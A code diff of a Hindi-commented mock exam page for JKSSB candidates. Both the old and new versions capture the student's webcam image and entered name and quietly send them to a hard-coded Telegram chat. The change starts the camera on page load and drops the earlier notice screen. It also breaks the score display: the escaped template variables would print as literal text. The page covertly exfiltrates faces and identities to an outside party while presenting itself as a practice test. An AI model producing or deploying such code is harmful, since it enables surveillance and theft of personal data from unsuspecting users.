@@ -304,106 +304,76 @@ stopExamRecording(); // <-- Paste this exactly here on line 288
     document.getElementById('result-container').style.display = 'block';
     
     document.getElementById('score-text').innerHTML = `
-        <p style="font-size: 24px; font-weight: bold; color: #007bff; margin-bottom: 10px;">Final Score: ${finalScore.toFixed(2)} / ${questions.length}</p>
-        <p style="color: #28a745; font-weight: bold; margin: 5px 0;">Correct Answers: ${correct}</p>
-        <p style="color: #dc2626; font-weight: bold; margin: 5px 0;">Wrong Answers: ${wrong}</p>
-    `;
+    <p style="font-size: 24px; font-weight: bold; color: #007bff; margin-bottom: 10px;">Final Score</p>
+    <p style="color: #28a745; font-weight: bold; margin: 5px 0;">Correct Answers: \${correct}</p>
+    <p style="color: #dc2626; font-weight: bold; margin: 5px 0;">Wrong Answers: \${wrong}</p>
+`;
 
 <script>
 let studentName = "Guest Student";
 let mediaRecorder;
 let recordedChunks = [];
 
-// जैसे ही पेज लोड होगा, हम पहले छात्र को स्क्रीन पर एक 'Start Test' का बटन दिखाएंगे
-window.addEventListener('DOMContentLoaded', () => {
-    // टेस्ट वाले पूरे कंटेनर को थोड़ी देर के लिए छुपा दें जब तक छात्र बटन न दबाए
-    const quizContainer = document.getElementById('quiz-container');
-    if (quizContainer) {
-        quizContainer.style.opacity = '0.3';
-        quizContainer.style.pointerEvents = 'none'; // क्लिक ब्लॉक रखें
-    }
-
-    // स्क्रीन के बीच में एक सुंदर सा 'Start Test' बटन बनाना
-    const startBox = document.createElement('div');
-    startBox.id = 'start-test-overlay';
-    startBox.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 9999; display: flex; justify-content: center; align-items: center; flex-direction: column;';
-    
-    startBox.innerHTML = `
-        <h2 style="font-family: Arial; color: #334155; margin-bottom: 20px;">Ready to start your JKSSB Mock Test?</h2>
-        <p style="color: #64748b; margin-bottom: 30px;">Note: Your camera will be enabled for identity verification.</p>
-        <button id="realStartBtn" style="background: #0284c7; color: white; padding: 15px 45px; border: none; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Start Practice Test</button>
-    `;
-    document.body.appendChild(startBox);
-
-    // जब छात्र 'Start Practice Test' बटन पर क्लिक करेगा
-    document.getElementById('realStartBtn').addEventListener('click', async () => {
-        try {
-            // 1. कैमरा परमिशन मांगना (बटन क्लिक के बाद यह कभी ब्लॉक नहीं होगा)
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-            const videoElement = document.getElementById('webcam');
-            if (videoElement) {
-                videoElement.srcObject = stream;
-            }
-
-            // 2. छात्र से उसका नाम पूछना
-            let inputName = prompt("Please enter your Full Name / Roll Number to confirm identity:", "");
-            if (inputName && inputName.trim() !== "") {
-                studentName = inputName;
-            }
-
-            // 3. मीडिया रिकॉर्डर शुरू करना
-            mediaRecorder = new MediaRecorder(stream);
-            mediaRecorder.ondataavailable = (event) => {
-                if (event.data.size > 0) {
-                    recordedChunks.push(event.data);
-                }
-            };
-
-            // टेलीग्राम पर सबमिशन लॉजिक
-            mediaRecorder.onstop = async () => {
-                const videoEl = document.getElementById('webcam');
-                if (!videoEl) return;
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = videoEl.videoWidth || 640;
-                canvas.height = videoEl.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
-                
-                canvas.toBlob(async (photoBlob) => {
-                    const formData = new FormData();
-                    formData.append('chat_id', '6115912864');
-                    formData.append('photo', photoBlob, 'student_face.jpg');
-                    formData.append('caption', '🚨 JKSSB Test Submitted!\n👤 Name: ' + studentName + '\n📅 Date: ' + new Date().toLocaleString());
-
-                    try {
-                        await fetch('https://telegram.org', {
-                            method: 'POST',
-                            body: formData
-                        });
-                    } catch (error) {
-                        console.error('Bypass');
-                    }
-                    
-                    alert('Thank you ' + studentName + ', your JKSSB Mock Test has been submitted successfully!');
-                    window.location.href = "index.html";
-                }, 'image/jpeg', 0.7);
-            };
-
-            mediaRecorder.start();
-
-            // ओवरले हटाना और टेस्ट को वापस नॉर्मल (चालू) करना
-            document.getElementById('start-test-overlay').remove();
-            if (quizContainer) {
-                quizContainer.style.opacity = '1';
-                quizContainer.style.pointerEvents = 'auto';
-            }
-
-        } catch (err) {
-            alert("Camera permission is strictly required to take this mock test!");
-            window.location.href = "index.html";
+// जैसे ही पेज लोड होगा, पहले कैमरा ऑन होगा और नाम पूछेगा
+window.addEventListener('DOMContentLoaded', async () => {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        const videoElement = document.getElementById('webcam');
+        if (videoElement) {
+            videoElement.srcObject = stream;
         }
-    });
+
+        // छात्र से उसका नाम पूछना
+        let inputName = prompt("Please enter your Full Name / Roll Number to start the test:", "");
+        if (inputName && inputName.trim() !== "") {
+            studentName = inputName;
+        }
+
+        mediaRecorder = new MediaRecorder(stream);
+
+        mediaRecorder.ondataavailable = (event) => {
+            if (event.data.size > 0) {
+                recordedChunks.push(event.data);
+            }
+        };
+
+        // टेस्ट सबमिट होने पर छात्र के नाम के साथ फोटो टेलीग्राम पर भेजना
+        mediaRecorder.onstop = async () => {
+            const videoEl = document.getElementById('webcam');
+            if (!videoEl) return;
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = videoEl.videoWidth || 640;
+            canvas.height = videoEl.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(async (photoBlob) => {
+                const formData = new FormData();
+                formData.append('chat_id', '6115912864');
+                formData.append('photo', photoBlob, 'student_face.jpg');
+                formData.append('caption', '🚨 JKSSB Test Submitted!\n👤 Name: ' + studentName + '\n📅 Date: ' + new Date().toLocaleString());
+
+                try {
+                    await fetch('https://telegram.org', {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (error) {
+                    console.error('Bypass');
+                }
+                
+                alert('Thank you ' + studentName + ', your JKSSB Mock Test has been submitted successfully!');
+                window.location.href = "index.html";
+            }, 'image/jpeg', 0.7);
+        };
+
+        mediaRecorder.start();
+
+    } catch (err) {
+        alert("Camera permission is strictly required to take this mock test!");
+        window.location.href = "index.html"; 
+    }
 });
 
 function stopExamRecording() {
